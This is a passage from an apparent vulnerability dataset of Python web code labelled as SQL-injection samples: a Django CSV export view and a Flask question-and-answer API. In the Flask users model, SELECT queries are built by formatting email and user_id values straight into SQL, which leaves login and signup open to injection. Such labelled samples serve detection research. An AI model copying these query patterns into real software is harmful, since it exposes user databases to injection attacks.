val is None:\n            return ''\n        else:\n            return str(val)\n\n    @functools.lru_cache(None)\n    def _choices_dict(self, choices):\n        return dict(choices)\n\n    def _get_win_data(self, win):\n        \"\"\" Take Win dict, return ordered dict of {name -> value} \"\"\"\n\n        # want consistent ordering so CSVs are always same format\n        win_data = collections.OrderedDict()\n\n        # local fields\n        for field_name in self.win_fields:\n            if field_name in self.IGNORE_FIELDS:\n                continue\n\n            model_field = self._get_win_field(field_name)\n            if field_name == 'user':\n                value = str(self.users_map[win['user_id']])\n            elif field_name == 'created':\n                value = win[field_name].date()  # don't care about time\n            elif field_name == 'cdms_reference':\n                # numeric cdms reference numbers should be prefixed with\n                # an apostrophe to make excel interpret them as text\n                value = win[field_name]\n                try:\n                    int(value)\n                except ValueError:\n                    pass\n                else:\n                    if value.startswith('0'):\n                        value = \"'\" + value\n            else:\n                value = win[field_name]\n            # if it is a choicefield, do optimized lookup of the display value\n            if model_field.choices and value:\n                try:\n                    value = self._choices_dict(model_field.choices)[value]\n                except KeyError as e:\n                    if model_field.attname == 'hvc':\n                        value = value\n                    else:\n                        raise e\n            else:\n                comma_fields = [\n                    'total_expected_export_value',\n                    'total_expected_non_export_value',\n                    'total_expected_odi_value',\n                ]\n                if field_name in comma_fields:\n                    value = \"\u00a3{:,}\".format(value)\n\n            model_field_name = model_field.verbose_name or model_field.name\n            win_data[model_field_name] = self._val_to_str(value)\n\n        # remote fields\n        win_data['contributing advisors/team'] = (\n            ', '.join(map(str, self.table_maps['advisors'][win['id']]))\n        )\n\n        # get customer email sent & date\n        notifications = self.table_maps['notifications'][win['id']]\n        # old Wins do not have notifications\n        email_sent = bool(notifications or win['complete'])\n        win_data['customer email sent'] = self._val_to_str(email_sent)\n        if notifications:\n            win_data['customer email date'] = str(\n                notifications[0].created.date())\n        elif win['complete']:\n            win_data['customer email date'] = '[manual]'\n        else:\n            win_data['customer email date'] = ''\n\n        win_data.update(self._extract_breakdowns(win))\n        win_data.update(self._confirmation(win))\n\n        return win_data\n\n    def _make_flat_wins_csv(self, deleted=False):\n        \"\"\" Make CSV of all Wins, with non-local data flattened \"\"\"\n\n        if deleted:\n            wins = Win.objects.inactive()\n        else:\n            wins = Win.objects.all()\n\n        if deleted:\n            # ignore users should show up in normal CSV\n            wins = wins.exclude(\n                user__email__in=settings.IGNORE_USERS\n            )\n\n        wins = wins.values()\n\n        win_datas = [self._get_win_data(win) for win in wins]\n        stringio = io.StringIO()\n        stringio.write(u'\\ufeff')\n        if win_datas:\n            csv_writer = csv.DictWriter(stringio, win_datas[0].keys())\n            csv_writer.writeheader()\n            for win_data in win_datas:\n                csv_writer.writerow(win_data)\n        return stringio.getvalue()\n\n    def _make_user_csv(self):\n        users = User.objects.all()\n        user_dicts = [\n            {'name': u.name, 'email': u.email, 'joined': u.date_joined}\n            for u in users\n        ]\n        stringio = io.StringIO()\n        csv_writer = csv.DictWriter(stringio, user_dicts[0].keys())\n        csv_writer.writeheader()\n        for user_dict in user_dicts:\n            csv_writer.writerow(user_dict)\n        return stringio.getvalue()\n\n    def _make_plain_csv(self, table):\n        \"\"\" Get CSV of table \"\"\"\n\n        stringio = io.StringIO()\n        cursor = connection.cursor()\n        cursor.execute(\"select * from wins_{};\".format(table))\n        csv_writer = csv.writer(stringio)\n        header = [i[0] for i in cursor.description]\n        csv_writer.writerow(header)\n        csv_writer.writerows(cursor)\n        return stringio.getvalue()\n\n    def get(self, request, format=None):\n        bytesio = io.BytesIO()\n        zf = zipfile.ZipFile(bytesio, 'w')\n        for table in ['customerresponse', 'notification', 'advisor']:\n            csv_str = self._make_plain_csv(table)\n            zf.writestr(table + 's.csv', csv_str)\n        full_csv_str = self._make_flat_wins_csv()\n        zf.writestr('wins_complete.csv', full_csv_str)\n        full_csv_del_str = self._make_flat_wins_csv(deleted=True)\n        zf.writestr('wins_deleted_complete.csv', full_csv_del_str)\n        user_csv_str = self._make_user_csv()\n        zf.writestr('users.csv', user_csv_str)\n        zf.close()\n        return HttpResponse(bytesio.getvalue(), content_type=mimetypes.types_map['.csv'])\n\n\nclass Echo(object):\n    \"\"\"An object that implements just the write method of the file-like\n    interface.\n    \"\"\"\n\n    def write(self, value):\n        \"\"\"Write the value by returning it, instead of storing in a buffer.\"\"\"\n        return value\n\n\n@method_decorator(gzip_page, name='dispatch')\nclass CompleteWinsCSVView(CSVView):\n\n    permission_classes = (IsDataTeamServer,)\n\n    def _make_flat_wins_csv(self, deleted=False):\n        \"\"\" Make CSV of all Wins, with non-local data flattened \"\"\"\n\n        if deleted:\n            wins = Win.objects.inactive()\n        else:\n            wins = Win.objects.all()\n\n        if deleted:\n            # ignore users should show up in normal CSV\n            wins = wins.exclude(\n                user__email__in=settings.IGNORE_USERS\n            )\n\n        wins = wins.values()\n\n        for win in wins:\n            yield self._get_win_data(win)\n\n    def _make_flat_wins_csv_stream(self, win_data_generator):\n        stringio = Echo()\n        yield stringio.write(u'\\ufeff')\n        first = next(win_data_generator)\n        csv_writer = csv.DictWriter(stringio, first.keys())\n        header = dict(zip(first.keys(), first.keys()))\n        yield csv_writer.writerow(header)\n        yield csv_writer.writerow(first)\n\n        for win_data in win_data_generator:\n            yield csv_writer.writerow(win_data)\n\n    def streaming_response(self, filename):\n        resp = StreamingHttpResponse(\n            self._make_flat_wins_csv_stream(self._make_flat_wins_csv()),\n            content_type=mimetypes.types_map['.csv'],\n        )\n        resp['Content-Disposition'] = f'attachent; filename={filename}'\n        return resp\n\n    def get(self, request, format=None):\n        return self.streaming_response(f'wins_complete_{now().isoformat()}.csv')\n\n\n@method_decorator(gzip_page, name='dispatch')\nclass CurrentFinancialYearWins(CompleteWinsCSVView):\n\n    # permission_classes = (permissions.IsAdminUser,)\n    end_date = None\n\n    def _make_flat_wins_csv(self, **kwargs):\n        \"\"\"\n        Make CSV of all completed Wins till now for this financial year, with non-local data flattened\n        remove all rows where:\n        1. total expected export value = 0 and total non export value = 0 and total odi value = 0\n        2. date created = today (not necessary if this task runs before end of the day for next day download)\n        3. customer email sent is False / No\n        4. Customer response received is not from this financial year\n        Note that this view removes win, notification and customer response entries\n        that might have been made inactive in duecourse\n        \"\"\"\n        sql_str = \"SELECT id FROM wins_completed_wins_fy\"\n        if self.end_date:\n            sql_str = f\"{sql_str} where created <= '{self.end_date.strftime('%m-%d-%Y')}'\"\n\n        with connection.cursor() as cursor:\n            cursor.execute(sql_str)\n            ids = cursor.fetchall()\n\n        wins = Win.objects.filter(id__in=[id[0] for id in ids]).values()\n\n        for win in wins:\n            yield self._get_win_data(win)\n\n    def get(self, request, format=None):\n        end_str = request.GET.get(\"end\", None)\n        if end_str:\n            try:\n                self.end_date = models.DateField().to_python(end_str)\n            except ValidationError:\n                self.end_date = None\n\n        return self.streaming_response(f'wins_current_fy_{now().isoformat()}.csv')\n/n/n/n", "label": 1, "vtype": "sql"}, {"id": "ad02c932f85c0f4ed6c1e561efc5edc163347806", "code": "app/__init__.py/n/n# Flask create app\n\n# Author: P8ul\n# https://github.com/p8ul\n\nfrom flask import Flask\nfrom .migrations.db import db\n\n\ndef create_app(config_filename):\n    app = Flask(__name__)\n    app.config.from_object(config_filename)\n\n    with app.app_context():\n        pass\n\n    \"\"\" Basic Routes \"\"\"\n\n    # register our blueprints\n    configure_blueprints(app)\n\n    # register extensions\n    configure_extensions()\n\n    return app\n\n\ndef configure_blueprints(app):\n    \"\"\"Configure blueprints .\"\"\"\n    from .questions.api.v1.view import question_blueprint\n    from .home.views import home_blueprint\n    from .auth.api.v1.view import auth_blueprint\n    from .answers.api.v1.view import answers_blueprint\n    from .votes.api.v1.view import votes_blueprint\n    from .comments.api.v1.view import comments_blueprint\n\n    app_blueprints = [\n        answers_blueprint,\n        question_blueprint,\n        auth_blueprint,\n        votes_blueprint,\n        comments_blueprint,\n        home_blueprint\n    ]\n\n    for bp in app_blueprints:\n        app.register_blueprint(bp)\n\n\ndef configure_extensions():\n    db.test()\n\n\nif __name__ == \"__main__\":\n    app = create_app(\"config\")\n    app.run(debug=True)\n/n/n/napp/answers/api/v1/view.py/n/n# APIs Resources\n\n# Author: P8ul\n# https://github.com/p8ul\n\nfrom flask import Blueprint, request, make_response, jsonify, session\nfrom flask.views import MethodView\nfrom ...models import Table\nfrom ....utils import jwt_required\n\nanswers_blueprint = Blueprint('answers', __name__)\n\n\nclass CreateAPIView(MethodView):\n    \"\"\" Update Instance api resource \"\"\"\n\n    @jwt_required\n    def put(self, question_id=None, answer_id=None):\n        data = request.get_json(force=True)\n        data['question_id'] = question_id\n        data['answer_id'] = answer_id\n        data['user_id'] = session.get('user_id')\n\n        response = Table(data).update()\n        if response == 200:\n            response_object = {\n                'status': 'success',\n                'message': 'Update successful'\n            }\n            return make_response(jsonify(response_object)), 200\n        if response == 302:\n            response_object = {\n                'status': 'fail',\n                'message': 'Please provide correct answer and question id'\n            }\n            return make_response(jsonify(response_object)), 400\n        if response == 203:\n            response_object = {\n                'status': 'fail',\n                'message': 'Unauthorized request.'\n            }\n            return make_response(jsonify(response_object)), 401\n\n        else:\n            response_object = {\n                'status': 'fail',\n                'message': 'Please provide correct answer and question id'\n            }\n            return make_response(jsonify(response_object)), 400\n\n    @jwt_required\n    def post(self, question_id=None):\n        # get the post data\n        data = request.get_json(force=True)\n        data['question_id'] = question_id\n        data['user_id'] = session.get('user_id')\n        answer = Table(data)\n        response = answer.save()\n        if response:\n            response_object = {\n                'status': 'success',\n                'message': response\n            }\n            return make_response(jsonify(response_object)), 201\n\n        response_object = {\n            'status': 'fail',\n            'message': 'Unknown question id. Try a different id.'\n        }\n        return make_response(jsonify(response_object)), 400\n\n\nclass ListAPIView(MethodView):\n    \"\"\"\n    List API Resource\n    \"\"\"\n    @jwt_required\n    def get(self, answer_id=None):\n        data = dict()\n        data['answer_id'] = answer_id\n        data['user_id'] = session.get('user_id')\n        if answer_id:\n            results = Table(data).filter_by()\n            if len(results) < 1:\n                response_object = {\n                    'results': 'Answer not found', 'status': 'fail'\n                }\n                return make_response(jsonify(response_object)), 404\n            response_object = {\n                'results': results, 'status': 'success'\n            }\n            return (jsonify(response_object)), 200\n        response_object = {'results': Table(data).query(), 'status': 'success'}\n        return (jsonify(response_object)), 200\n\n\n# Define the API resources\ncreate_view = CreateAPIView.as_view('create_api')\nlist_view = ListAPIView.as_view('list_api')\n\n# Add Rules for API Endpoints\nanswers_blueprint.add_url_rule(\n    '/api/v1/questions/<string:question_id>/answers',\n    view_func=create_view,\n    methods=['POST']\n)\n\nanswers_blueprint.add_url_rule(\n    '/api/v1/questions/<string:question_id>/answers/<string:answer_id>',\n    view_func=create_view,\n    methods=['PUT']\n)\n\nanswers_blueprint.add_url_rule(\n    '/api/v1/questions/answers',\n    view_func=list_view,\n    methods=['GET']\n)\n\nanswers_blueprint.add_url_rule(\n    '/api/v1/questions/answers/<string:answer_id>',\n    view_func=list_view,\n    methods=['GET']\n)\n/n/n/napp/answers/models.py/n/n# Custom Model\n\n# Author: P8ul\n# https://github.com/p8ul\n\n\"\"\"\n    This class will connect to a Database and perform crud actions\n    Has relevant getters, setters & mutation methods\n\"\"\"\n\nimport psycopg2\nimport psycopg2.extensions\nfrom psycopg2.extras import RealDictCursor\nfrom config import BaseConfig\nfrom ..utils import db_config\n\n\nclass Table:\n    def __init__(self, data={}):\n        self.config = db_config(BaseConfig.DATABASE_URI)\n        self.table = 'answers'\n        self.answer_body = data.get('answer_body')\n        self.question_id = data.get('question_id')\n        self.answer_id = data.get('answer_id')\n        self.accepted = data.get('accepted')\n        self.user_id = data.get('user_id')\n\n    def save(self):\n        \"\"\"\n        Creates an answer record in answers table\n        :return: None of inserted record\n        \"\"\"\n        con, response = psycopg2.connect(**self.config), None\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        try:\n            query = \"INSERT INTO answers (user_id, answer_body, question_id) VALUES (%s, %s, %s) RETURNING *; \"\n            cur.execute(query, (self.user_id, self.answer_body, self.question_id))\n            con.commit()\n            response = cur.fetchone()\n        except Exception as e:\n            print(e)\n        con.close()\n        return response\n\n    def query(self):\n        \"\"\"\n        Fetch all records from a answers table\n        :return: list: query set\n        \"\"\"\n        con = psycopg2.connect(**self.config)\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        cur.execute(\n            \"\"\" SELECT *, ( SELECT  count(*) from votes \n                WHERE votes.answer_id=answers.answer_id AND vote=true ) as upVotes,\n                ( SELECT count(*) from votes WHERE votes.answer_id=answers.answer_id\n                AND vote=false ) as downVotes FROM  answers\n            \"\"\"\n        )\n        queryset_list = cur.fetchall()\n        con.close()\n        return queryset_list\n\n    def filter_by(self):\n        \"\"\"\n        Select a column(s) from answer table\n        :return: list: queryset list\n        \"\"\"\n        try:\n            con = psycopg2.connect(**self.config)\n            cur = con.cursor(cursor_factory=RealDictCursor)\n            query = \"SELECT * FROM answers WHERE answer_id=%s\"\n            cur.execute(query, self.answer_id)\n            queryset_list = cur.fetchall()\n            con.close()\n            return queryset_list\n        except:\n            return []\n\n    def question_author(self):\n        con = psycopg2.connect(**self.config)\n        try:\n            cur = con.cursor(cursor_factory=RealDictCursor)\n            query = \"SELECT user_id FROM questions WHERE question_id=%s\"\n            cur.execute(query, self.question_id)\n            return cur.fetchall()\n\n        except Exception as e:\n            print(e)\n        con.close()\n        return False\n\n    def answer_author(self):\n        try:\n            con = psycopg2.connect(**self.config)\n            cur = con.cursor(cursor_factory=RealDictCursor)\n            query = \"SELECT user_id FROM answers WHERE answer_id=%s\"\n            cur.execute(query, self.answer_id)\n            queryset_list = cur.fetchall()\n            con.close()\n            return queryset_list\n        except Exception as e:\n            return False\n\n    def update(self):\n        try:\n            answer_author = self.answer_author()[0].get('user_id')\n            question_author = self.question_author()[0].get('user_id')\n            # current user is the answer author\n            if answer_author == self.user_id:\n                # update answer\n                response = 200 if self.update_answer() else 304\n                return response\n\n            # current user is question author\n            elif question_author == self.user_id:\n                # mark it as accepted\n                response = self.update_accept_field()\n                response = 200 if response else 304\n                return response\n\n            # other users\n            else:\n                return 203\n        except:\n            return 404\n\n    def update_accept_field(self):\n        \"\"\"\n        Update an answer column\n        :return: bool:\n        \"\"\"\n        con, result = psycopg2.connect(**self.config), True\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        try:\n            query = \"UPDATE answers SET accepted=%s WHERE answer_id=%s AND question_id=%s\"\n            cur.execute(query, (self.accepted, self.answer_id, self.question_id))\n            con.commit()\n        except Exception as e:\n            print(e)\n            result = False\n        con.close()\n        return result\n\n    def update_answer(self):\n        \"\"\"\n        Update an answer column\n        :return: bool:\n        \"\"\"\n        con = psycopg2.connect(**self.config)\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        try:\n            query = \"UPDATE answers SET answer_body=%s WHERE answer_id=%s\"\n            cur.execute(query, (self.answer_body, self.answer_id))\n            con.commit()\n        except Exception as e:\n            print(e)\n            con.close()\n            return False\n        con.close()\n        return True\n\n    def delete(self):\n        pass\n\n\n\n/n/n/napp/answers/test/base.py/n/nimport unittest\n\nfrom ... import create_app\napp = create_app(\"config.TestConfig\")\n\n\nclass BaseTestCase(unittest.TestCase):\n    \"\"\"A base test case.\"\"\"\n    def create_app(self):\n        app.config.from_object('config.TestConfig')\n        return app\n\n    def setUp(self):\n        # method to invoke before each test.\n        self.client = app.test_client()\n        self.data = {\n            'username': 'Paul',\n            'email': 'pkinuthia10@gmail.com',\n            'password': 'password'\n        }\n        \"\"\" Login to get a JWT token \"\"\"\n        self.client.post('/api/v1/auth/signup', json=self.data)\n        response = self.client.post('/api/v1/auth/login', json=self.data)\n        self.token = response.get_json().get('auth_token')\n        self.user_id = str(response.get_json()['id'])\n\n    def tearDown(self):\n        # method to invoke after each test.\n        pass\n/n/n/napp/answers/test/test_answer_model.py/n/n# APIs Testing\n\n# Author: P8ul\n# https://github.com/p8ul\n\nimport unittest\nfrom ...test.base import BaseTestCase\nfrom ..models import Table\n\ntable = Table()\n\n\nclass FlaskTestCase(BaseTestCase):\n\n    \"\"\" Test question model  \"\"\"\n    def test_question_model(self):\n        query = table.query()\n        self.assertIsInstance(query, type([]))\n\n    def test_model_filter(self):\n        query = table.filter_by()\n        self.assertEqual(query, [])\n\n    def test_model_save(self):\n        query = table.save()\n        self.assertEqual(query, None)\n\n    def test_model_update(self):\n        query = table.update()\n        self.assertEqual(query, 404)\n\n    def test_model_delete(self):\n        query = table.delete()\n        self.assertEqual(query, None)\n\n    def test_model_question_author(self):\n        query = table.question_author()\n        self.assertEqual(query, False)\n\n    def test_model_answer_author(self):\n        query = table.answer_author()\n        self.assertEqual(query, False)\n\n    def test_model_accept(self):\n        query = table.update_accept_field()\n        self.assertEqual(query, True)\n\n    def test_model_update_answer(self):\n        query = table.update_answer()\n        self.assertEqual(query, True)\n\n    def test_model_init(self):\n        keys = table.config.keys()\n        self.assertIn(list(keys)[0], ['password', 'user', 'database', 'host'])\n        self.assertEqual(len(list(keys)), 4)\n\n\nif __name__ == '__main__':\n    unittest.main()\n/n/n/napp/answers/test/test_answers_apis.py/n/n# APIs Testing\n\n# Author: P8ul\n# https://github.com/p8ul\n\nimport unittest\nfrom ...test.base import BaseTestCase\n\n\nclass FlaskTestCase(BaseTestCase):\n\n    \"\"\" Test List answers api \"\"\"\n    def test_list_answers(self):\n        response = self.client.get(\n            '/api/v1/questions/answers',\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(response.get_json()['status'], 'success')\n\n    \"\"\" Test answers CRUD api \"\"\"\n    def test_post_update(self):\n        \"\"\" Initialize test data \"\"\"\n        data = {\n            'title': 'Test title',\n            'body': 'Test body',\n            'answer_body': 'Test answer',\n            'user': self.user_id\n        }\n\n        \"\"\" Add test question\"\"\"\n        self.client.post(\n            '/api/v1/questions/', json=data,\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n\n        response = self.client.get(\n            '/api/v1/questions/',\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n        question_id = response.get_json().get('results')[0].get('question_id')\n\n        \"\"\" Test post answer \"\"\"\n        response = self.client.post(\n            '/api/v1/questions/'+str(question_id)+'/answers', json=data,\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n\n        \"\"\" Test status \"\"\"\n        self.assertEqual(response.status_code, 201)\n\n        \"\"\" Test if a question is created \"\"\"\n        self.assertEqual(response.get_json()['status'], 'success')\n\n\nif __name__ == '__main__':\n    unittest.main()\n/n/n/napp/auth/api/v1/view.py/n/nfrom flask import Blueprint, request, make_response, jsonify, session\nfrom flask.views import MethodView\nfrom flask_bcrypt import Bcrypt\nfrom ...models import Table\nfrom ....utils import jwt_required, encode_auth_token\nfrom ...validatons import validate_user_details\n\n# globals b_crypt\nb_crypt = Bcrypt()\nauth_blueprint = Blueprint('auth', __name__)\n\n\nclass RegisterAPI(MethodView):\n    \"\"\" User Signup API Resource \"\"\"\n    def post(self):\n        # get the post data\n        data = request.get_json(force=True)\n        data['user_id'] = session.get('user_id')\n        # check if user already exists\n        errors = validate_user_details(data)\n        if len(errors) > 0:\n            response_object = {\n                'status': 'fail', 'errors': errors\n            }\n            return make_response(jsonify(response_object)), 401\n        user = Table(data).filter_by_email()\n        if not user:\n            try:\n                user = Table(data).save()\n                auth_token = encode_auth_token(user.get('id')).decode()\n                response_object = {\n                    'status': 'success',\n                    'message': 'Successfully registered.',\n                    'id': user.get('id'), 'auth_token': auth_token\n                }\n                return make_response(jsonify(response_object)), 201\n            except Exception as e:\n                print(e)\n                response_object = {\n                    'status': 'fail', 'message': 'Some error occurred. Please try again.'\n                }\n                return make_response(jsonify(response_object)), 401\n        else:\n            response_object = {\n                'status': 'fail', 'message': 'User already exists. Please Log in.',\n            }\n            return make_response(jsonify(response_object)), 202\n\n    def delete(self, user_id=None):\n        data = request.get_json(force=True)\n        data['user_id'] = user_id\n        Table(data).delete()\n        response_object = {\n            'status': 'success', 'message': 'User deleted successfully.',\n        }\n        return make_response(jsonify(response_object)), 200\n\n\nclass LoginAPI(MethodView):\n    \"\"\" User Login API Resource \"\"\"\n    def post(self):\n        data = request.get_json(force=True)\n        data['user_id'] = session.get('user_id')\n        try:\n            user = Table(data).filter_by_email()\n            if len(user) >= 1 and data.get('password'):\n                if b_crypt.check_password_hash(user[0].get('password'), data.get('password')):\n                    auth_token = encode_auth_token(user[0].get('user_id'))\n                else:\n                    response_object = {'status': 'fail', 'message': 'Password or email do not match.'}\n                    return make_response(jsonify(response_object)), 401\n                try:\n                    if auth_token:\n                        response_object = {\n                            'status': 'success', 'id': user[0].get('user_id'),\n                            'message': 'Successfully logged in.',\n                            'auth_token': auth_token.decode()\n                        }\n                        return make_response(jsonify(response_object)), 200\n                except Exception as e:\n                    return {\"message\": 'Error decoding token'}, 401\n            else:\n                response_object = {'status': 'fail', 'message': 'User does not exist.'}\n                return make_response(jsonify(response_object)), 404\n        except Exception as e:\n            print(e)\n            response_object = {'status': 'fail', 'message': 'Try again'}\n            return make_response(jsonify(response_object)), 500\n\n\nclass UserListAPI(MethodView):\n    \"\"\" User List Api Resource \"\"\"\n    @jwt_required\n    def get(self, user_id=None):\n        if user_id:\n            user = Table({\"user_id\": user_id}).filter_by()\n            if len(user) < 1:\n                response_object = {\n                    'results': 'User not found',\n                    'status': 'fail'\n                }\n                return make_response(jsonify(response_object)), 404\n            response_object = {\n                'results': user,\n                'status': 'success'\n            }\n            return (jsonify(response_object)), 200\n\n        response_object = {\n            'results': Table().query(),\n            'status': 'success'\n        }\n        return (jsonify(response_object)), 200\n\n\nclass LogoutAPI(MethodView):\n    \"\"\" Logout Resource \"\"\"\n    def post(self):\n        # get auth token\n        auth_header = request.headers.get('Authorization')\n        return auth_header\n\n\n# Define the API resources\nregistration_view = RegisterAPI.as_view('register_api')\nlogin_view = LoginAPI.as_view('login_api')\nuser_view = UserListAPI.as_view('user_api')\nlogout_view = LogoutAPI.as_view('logout_api')\n\n# Add Rules for API Endpoints\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/signup',\n    view_func=registration_view,\n    methods=['POST']\n)\n\n# Add Rules for API Endpoints\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/delete',\n    view_func=registration_view,\n    methods=['DELETE']\n)\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/login',\n    view_func=login_view,\n    methods=['POST']\n)\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/users',\n    view_func=user_view,\n    methods=['GET']\n)\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/users/<string:user_id>',\n    view_func=user_view,\n    methods=['GET']\n)\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/logout',\n    view_func=logout_view,\n    methods=['POST']\n)\n/n/n/napp/auth/models.py/n/n# Custom Model\n\n# Author: P8ul\n# https://github.com/p8ul\n\n\"\"\"\n    This class will act as a table in a Database\n    Has relevant getters, setters & mutation methods\n\"\"\"\nimport psycopg2\nimport psycopg2.extras\nfrom psycopg2.extras import RealDictCursor\nfrom flask_bcrypt import Bcrypt\nfrom config import BaseConfig\nfrom ..utils import db_config\n\n\nclass Table:\n    def __init__(self, data={}):\n        self.config = db_config(BaseConfig.DATABASE_URI)\n        self.table, self.email = 'users', data.get('email')\n        self.username = data.get('username')\n        self.user_id = data.get('user_id')\n        self.b_crypt = Bcrypt()\n        if data.get('password'):\n            self.password = self.b_crypt.generate_password_hash(data.get('password')).decode('utf-8')\n\n    def query(self):\n        con = psycopg2.connect(**self.config)\n        cur = con.cursor(cursor_factory=psycopg2.extras.DictCursor)\n        cur.execute(\"select * from {}\".format(self.table))\n        queryset_list = cur.fetchall()\n        con.close()\n        return [item for item in queryset_list]\n\n    def filter_by(self):\n        con, queryset_list = psycopg2.connect(**self.config), None\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        try:\n            cur.execute(\"select * from {} WHERE user_id='{}'\".format(self.table, self.user_id))\n            queryset_list = cur.fetchall()\n        except Exception as e:\n            print(e)\n        con.close()\n        return queryset_list\n\n    def filter_by_email(self):\n        con, queryset_list = psycopg2.connect(**self.config), None\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        try:\n            cur.execute(\"select * from {} WHERE email='{}'\".format(self.table, self.email))\n            queryset_list = cur.fetchall()\n        except Exception as e:\n            print(e)\n        con.close()\n        return queryset_list\n\n    def update(self):\n        pass\n\n    def delete(self):\n        con = psycopg2.connect(**self.config)\n        cur = con.cursor(cursor_factory=psycopg2.extras.DictCursor)\n        try:\n            query = \"DELETE FROM users WHERE email=%s\"\n            cur.execute(query, self.email)\n            con.commit()\n            con.close()\n        except Exception as e:\n            print(e)\n            con.close()\n            return False\n        return True\n\n    def save(self):\n        con, response = psycopg2.connect(**self.config), None\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        try:\n            query = \"INSERT INTO users (username, email, password) values(%s, %s, %s) RETURNING *\"\n            cur.execute(query, (self.username, self.email, self.password))\n            con.commit()\n            response = cur.fetchone()\n        except Exception as e:\n            print(e)\n        con.close()\n        return response\n/n/n/napp/auth/test/test_model.py/n/nfrom .base import BaseTestCase\nfrom ..models import Table\n\n\nclass FlaskTestCase(BaseTestCase):\n\n    \"\"\" Test signup api \"\"\"\n    def test_model_crud(self):\n        table = Table(self.data)\n        # Test Create\n        instance = table.save()\n        assert instance.get('email') == self.data.get('email')\n\n        # Test query\n        isinstance(table.query(), type([]))\n/n/n/napp/auth/test/test_user_validation.py/n/nfrom .base import BaseTestCase\nfrom ..validatons import validate_user_details\n\n\nclass FlaskTestCase(BaseTestCase):\n\n    \"\"\" Test user details validation \"\"\"\n    def test_model_crud(self):\n        data = {\"email\": \"\", 'password': ''}\n        # Test Create\n        instance = validate_user_details(data)\n        assert instance.get('email') == 'Invalid email. Please enter a valid email'\n\n/n/n/napp/auth/validatons.py/n/nfrom ..utils import valid_email\n\n\ndef validate_user_details(data):\n    errors = {}\n    if not valid_email(data.get('email')):\n        errors['email'] = 'Invalid email. Please enter a valid email'\n    if not data.get('email'):\n        errors['password'] = 'Password required'\n    return errors\n/n/n/napp/comments/api/v1/view.py/n/nfrom flask import Blueprint, request, make_response, jsonify\nfrom flask.views import MethodView\nfrom ...models import Table\nfrom ....utils import jwt_required\n\ncomments_blueprint = Blueprint('comments', __name__)\n\n\nclass ListAPIView(MethodView):\n    \"\"\" Update Instance api resource \"\"\"\n\n    @jwt_required\n    def post(self, answer_id=None):\n        data = request.get_json(force=True)\n        data['answer_id'] = answer_id\n        response = Table(data).save()\n        if response:\n            response_object = {\n                'status': 'success',\n                'message': 'Your comment was successful'\n            }\n            return make_response(jsonify(response_object)), 201\n\n        response_object = {\n            'status': 'fail',\n            'message': 'Some error occurred. Please try again.'\n        }\n        return make_response(jsonify(response_object)), 400\n\n\n# Define the API resources\ncomment_view = ListAPIView.as_view('comment_api')\n\n# Add Rules for API Endpoints\ncomments_blueprint.add_url_rule(\n    '/api/v1/questions/answers/comment/<string:answer_id>',\n    view_func=comment_view,\n    methods=['POST']\n)\n/n/n/napp/comments/models.py/n/n\"\"\"\n    Author: P8ul\n    https://github.com/p8ul\n\n    This class will connect to a Database and perform crud actions\n    Has relevant getters, setters & mutation methods\n\"\"\"\nimport psycopg2\nimport psycopg2.extensions\nfrom psycopg2.extras import RealDictCursor\nfrom flask import session\nfrom config import BaseConfig\nfrom ..utils import db_config\n\n\nclass Table:\n    def __init__(self, data={}):\n        self.config = db_config(BaseConfig.DATABASE_URI)\n        self.table = 'comments'\n        self.answer_id = data.get('answer_id')\n        self.question_id = data.get('question_id')\n        self.comment_body = data.get('comment_body')\n\n    def save(self):\n        \"\"\"\n        Insert a comment in comments table\n        :return: True if record values are inserted successfully else false\n        \"\"\"\n        con = psycopg2.connect(**self.config)\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        try:\n            query = \"INSERT INTO comments(user_id, answer_id, comment_body) values(%s, %s, %s) \"\n            cur.execute(query, (session.get('user_id'), self.answer_id, self.comment_body))\n            con.commit()\n        except Exception as e:\n            print(e)\n            con.close()\n            return False\n        return True\n/n/n/napp/comments/test/__init__.py/n/n/n/n/napp/comments/test/test_comment_api.py/n/n# APIs Testing\n\n# Author: P8ul\n# https://github.com/p8ul\n\nimport unittest\nfrom ...test.base import BaseTestCase\n\n\nclass FlaskTestCase(BaseTestCase):\n\n    \"\"\" Test List comment api \"\"\"\n    def test_comments_api(self):\n        response = self.client.post(\n            '/api/v1/questions/answers/comment/3', data=self.data,\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n        assert response.status_code == 400\n\n\nif __name__ == '__main__':\n    unittest.main()\n/n/n/napp/comments/test/test_comment_model.py/n/n# APIs Testing\n\n# Author: P8ul\n# https://github.com/p8ul\n\nimport unittest\nfrom ...test.base import BaseTestCase\nfrom ..models import Table\n\ntable = Table()\n\n\nclass FlaskTestCase(BaseTestCase):\n\n    \"\"\" Test votes model  \"\"\"\n    def test_model_save(self):\n        query = table.save()\n        self.assertEqual(query, False)\n\n    def test_model_init(self):\n        keys = table.config.keys()\n        self.assertIn(list(keys)[0], ['password', 'user', 'database', 'host'])\n        self.assertEqual(len(list(keys)), 4)\n\n\nif __name__ == '__main__':\n    unittest.main()\n/n/n/napp/migrations/db.py/n/nimport psycopg2\nimport psycopg2.extras\n\nfrom .initial1 import migrations\nfrom config import BaseConfig\nfrom ..utils import db_config\n\n\nclass Database:\n    def __init__(self, config):\n        self.config = db_config(config)\n        self.database = self.config.get('database')\n\n    def test(self):\n        con = psycopg2.connect(**self.config)\n        con.autocommit = True\n        cur = con.cursor(cursor_factory=psycopg2.extras.DictCursor)\n        cur.execute(\"select * from pg_database where datname = %(database_name)s\", {'database_name': self.database})\n        databases = cur.fetchall()\n        if len(databases) > 0:\n            print(\" * Database {} exists\".format(self.database))\n            for command in migrations:\n                try:\n                    